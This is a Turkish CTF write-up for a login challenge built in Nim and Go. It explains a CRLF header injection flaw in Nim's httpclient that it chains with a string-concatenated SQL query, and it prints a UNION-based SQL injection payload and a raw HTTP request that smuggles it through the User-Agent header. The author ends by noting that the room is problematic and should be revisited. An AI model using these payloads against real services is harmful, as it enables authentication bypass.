---
{"dg-publish":true,"permalink":"/ctf/synopsis-challenges/"}
---

Bu zorluk, Golang ve Nim ile yazılmış bir kullanıcı girişi web uygulamasını içeriyor


### Gerekli Beceriler
* Golang hakkında temel bilgi
* Temel Nim anlayışı
* HTTP protokolünün temel düzeyde anlaşılması
* Temel SQL anlayışı
* *Bilinen* açıkları arama konusunda deneyim


### Öğrenilen Beceriler

* CRLF injection 
* SQL injection login bypass


### Uygulamaya Genel Bakış

![Pasted image 20250130141100.png](/img/user/resimler/Pasted%20image%2020250130141100.png)


### Nim'in httpclient CRLF Enjeksiyonu Güvenlik Açığı

main.nim dosyası, rotalar bölümünde SQL enjeksiyonunu kontrol eden bir kod parçası içerir:

```
import asyncdispatch, strutils, jester, httpClient, json
import std/uri

const userApi = "http://127.0.0.1:9090"

proc msgjson(msg: string): string =
  """{"msg": "$#"}""" % [msg]

proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false

settings:
  port = Port 1337

routes:
  post "/user":
    let username = @"username"
    let password = @"password"

    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

    let userAgent = decodeUrl(request.headers["user-agent"])

    let jsonData = %*{
      "username": username,
      "password": password
    }

    let jsonStr = $jsonData

    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

    if response.code != Http200:
      resp msgjson(response.body.strip())
       
    resp msgjson(readFile("/flag.txt"))

runForever()

```


---

Bu kod, **Nim** dilinde yazılmış bir web sunucusunu temsil ediyor ve aşağıdaki işlevlere sahip. Sunucu, `/user` rotası üzerinden gelen HTTP POST isteklerini işliyor ve SQL enjeksiyon koruması sağlıyor. Ayrıca bir başka API'ye istek gönderip yanıtını döndürme veya dosyadan veri okuma işlemleri yapıyor.

1. **Kütüphane İçe Aktarma**

```
import asyncdispatch, strutils, jester, httpClient, json
import std/uri
```

- **asyncdispatch:** Asenkron işlemleri yönetmek için.
- **strutils:** Metin işleme yardımcı işlevlerini sağlar.
- **jester:** Bir web sunucusu oluşturmak için kullanılan bir framework.
- **httpClient:** HTTP istekleri yapmak için.
- **json:** JSON verisi oluşturma ve işleme için.
- **std/uri:** URL kodlama ve çözme işlevleri için.


2. **Sabit Tanımlama**

```
const userApi = "http://127.0.0.1:9090"
```

`userApi`: Kullanıcı doğrulama için iletişim kurulan başka bir API'nin adresi.


3. **Yardımcı İşlevler**

**`msgjson` Fonksiyonu**  
Bu fonksiyon, bir mesajı JSON formatına dönüştürür:


```
proc msgjson(msg: string): string =
  """{"msg": "$#"}""" % [msg]
```

Örnek:

```
msgjson("Hello")  # {"msg": "Hello"}
```

**`containsSqlInjection` Fonksiyonu**  
Bu fonksiyon, bir girdide SQL enjeksiyonu belirtileri olup olmadığını kontrol eder:

```
proc containsSqlInjection(input: string): bool =
  for c in input:
    let ordC = ord(c)
    if not ((ordC >= ord('a') and ordC <= ord('z')) or
            (ordC >= ord('A') and ordC <= ord('Z')) or
            (ordC >= ord('0') and ordC <= ord('9'))):
      return true
  return false

```

- Yalnızca harfler (`a-z`, `A-Z`) ve rakamlar (`0-9`) izinlidir.
- Harf veya rakam dışında bir karakter bulunursa, `true` döner .

4. **Sunucu Ayarları**

```
settings:
  port = Port 1337

```

Sunucu, `1337` numaralı portta çalışır.


5. **Rota Tanımlaması**

`/user` Rotası:

```
routes:
  post "/user":
    let username = @"username"
    let password = @"password"

```

POST isteğinde gelen `username` ve `password` verilerini alır.


SQL Enjeksiyonu Kontrolü:

```
    if containsSqlInjection(username) or containsSqlInjection(password):
      resp msgjson("Malicious input detected")

```

* Girdilerde SQL enjeksiyonu belirtileri varsa, `"Malicious input detected"` mesajını döndürür ve işlem sonlanır.

User-Agent İşleme:

```
    let userAgent = decodeUrl(request.headers["user-agent"])
```

* İstek başlığındaki `User-Agent` bilgisini alır ve URL kodlamasını çözer.


JSON Verisi Hazırlama:

```
    let jsonData = %*{
      "username": username,
      "password": password
    }
    let jsonStr = $jsonData

```



API'ye İstek Gönderme:

```
    let client = newHttpClient(userAgent)
    client.headers = newHttpHeaders({"Content-Type": "application/json"})

    let response = client.request(userApi & "/login", httpMethod = HttpPost, body = jsonStr)

```

- Bir HTTP client'ine oluşturulur ve `userApi` adresine `/login` son noktasına bir POST isteği gönderilir.
- Request bodysine hazırlanan JSON verisi eklenir.


Response İşleme:

```
    if response.code != Http200:
      resp msgjson(response.body.strip())

```

Yanıtın HTTP durumu `200 OK` değilse, yanıt gövdesini (API'nin döndürdüğü mesaj) döndürür.


Başarılı İşlem:

```
    resp msgjson(readFile("/flag.txt"))
```

* Eğer her şey başarılı olursa, `/flag.txt` dosyasındaki içeriği okuyup bir JSON mesajı olarak döndürür.

6. **Sunucuyu Çalıştırma**

```
runForever()
```

Sunucu, gelen istekleri sürekli olarak dinler.


### Özet İş Akışı:

1. Kullanıcı `/user` rotasına bir POST isteği yapar.
2. Kullanıcı adı ve şifre SQL enjeksiyonu kontrolünden geçer.
3. Kontrolleri geçen bilgiler, başka bir API'ye (`userApi`) doğrulama için gönderilir.
4. API yanıtı başarıysa `/flag.txt` dosyasının içeriği döndürülür. Başarısızsa, API'nin yanıt mesajı iletilir.

---

Nims standart http kütüphanesi <=1.2.6 sürümünden itibaren CRLF enjeksiyonundan muzdariptir https://consensys.io/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/ Dockerfile'a bakarak challenge'ın savunmasız olduğunu doğrulayabiliriz , satır 22'de nim 1.2.4 yüklüdür.


![Pasted image 20250130144601.png](/img/user/resimler/Pasted%20image%2020250130144601.png)

### **CRLF Injection Nedir?**

**CRLF Injection (CRLF Enjeksiyonu)**, bir saldırganın uygulama veya sunucuya kötü niyetli `\r\n` karakterlerini enjekte ederek beklenmedik davranışlara neden olduğu bir saldırı türüdür. Bu saldırı genellikle kötü yapılandırılmış web uygulamalarında veya güvenlik doğrulaması olmayan HTTP yanıt başlıklarında görülür.

Bu güvenlik açığından yararlanmak için, HTTP POST isteğindeki "user agent" başlığını, CRLF (Carriage Return Line Feed) dizisi ve ardından SQL enjeksiyon kontrolünü atlatacak bir payload içerecek şekilde değiştirebiliriz.


### SQL Injection

`main.go` dosyası, `/login` rotasını işleyen bir Golang sunucusu uygular. Ayrıca, izin verilen user agent'lardan biriyle eşleştiğinden emin olmak için user agent'ı kontrol eder.

Ancak, SQL sorgusunun oluşturulma şeklinde bir güvenlik açığı bulunmaktadır. Kod, kullanıcı girdisini doğrudan SQL sorgu dizesine ekler, bu da bir saldırganın SQL enjeksiyon saldırısı gerçekleştirmesine olanak tanır. Bu güvenlik açığı, aşağıdaki kod satırlarında bulunabilir:

```
row := db.QueryRow("SELECT * FROM users WHERE username='" + user.Username + "';")
```

Bu güvenlik açığından yararlanmak için, user agent kontrolünü atlamak ve SQL enjeksiyon saldırısı içeren bir payload enjekte etmek için Nim CRLF enjeksiyon güvenlik açığını kullanabiliriz.

Bu iki adımı gerçekleştirerek, flag'i almak için hem Nim hem de Golang'daki güvenlik açıklarından yararlanabiliriz.

```
let payload = """{"username":"' UNION SELECT 1, 'test', '$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq","password":"test "}"""
```

Bu payload user agent header'ına enjekte edildiğinde SQL injection kontrolü atlanacak ve kod aşağıdaki sorguyu çalıştıracaktır:

```
SELECT * FROM users WHERE username='' UNION SELECT 1, 'test', '$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq' AND password='test';
```

Bu sorgu, istekte sağladığımız parola ile eşleşen rastgele bir parola hash'ine sahip sahte bir kullanıcı döndürecektir.

Ayrıca, isteğin Content-Length'i ile tam olarak eşleşmesi için CRLF payload'unun tam karakter uzunluğuna sahip sahte bir kullanıcı adı ve şifre eklenir, böylece enjekte edilen içerik orijinalinin üzerine yazılır.

```
POST http://127.0.0.1:1337/user
User-Agent: ChromeBot/9.5%0D%0A%0D%0A{"username":"' UNION SELECT 1, 'test',
'$2a$10$iN4TZptSPm634thWzJmklOEarWGSu6JbWTfNbWntYMqgoRsMsjLjq","password":"test
"}
Accept-Encoding: gzip, deflate, br, zstd
Accept: */*
Connection: keep-alive
Content-Length: 110
Content-Type: application/x-www-form-urlencoded
username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaa&password=aaaa
```


Bu oda sorunlu sonra bak .....

